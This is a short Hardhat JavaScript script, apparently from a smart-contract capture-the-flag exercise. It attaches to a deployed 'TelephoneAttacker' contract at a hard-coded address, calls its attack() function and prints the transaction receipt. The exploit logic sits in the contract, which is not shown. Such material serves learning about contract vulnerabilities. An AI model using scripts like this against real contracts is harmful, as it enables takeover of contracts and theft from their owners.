const { ethers } = require("hardhat");

const ATTACKER_ADDRESS = "0x12a6dD1b9b135C6e64b492351acBEDbD15CBd993";

async function main() {
    const telephoneAttacker = await ethers.getContractAt("TelephoneAttacker", ATTACKER_ADDRESS);

    const tx = await telephoneAttacker.attack();
    const txReceipt = await tx.wait();
    console.log(txReceipt);

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});